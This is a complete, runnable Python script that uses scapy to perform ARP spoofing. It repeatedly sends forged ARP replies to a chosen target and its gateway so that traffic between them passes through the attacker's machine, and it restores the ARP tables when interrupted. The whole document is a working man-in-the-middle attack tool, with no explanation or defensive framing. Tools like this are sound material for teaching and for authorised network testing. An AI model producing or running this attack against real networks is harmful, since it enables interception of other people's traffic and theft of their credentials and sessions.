#!/usr/bin/python3.8

import time
import scapy.all as scapy
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target IP address to spoof")
    parser.add_option("-g", "--gateway", dest="gateway", help="Gateway IP address to spoof")
    (options, arguments) = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify the target IP, use --help for more info")
    elif not options.gateway:
        parser.error("[-] Please specify the gateway IP, use --help for more info")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()

try:
    sent_packets_count = 0
    while True:
        spoof(options.target, options.gateway)
        spoof(options.gateway, options.target)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count} ", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print(" [+] Detected CTRL+C. Resetting ARP tables...")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
    print("[+] ARP tables are restored. Quit.")
except IndexError:
    print("[-] No target device found.")
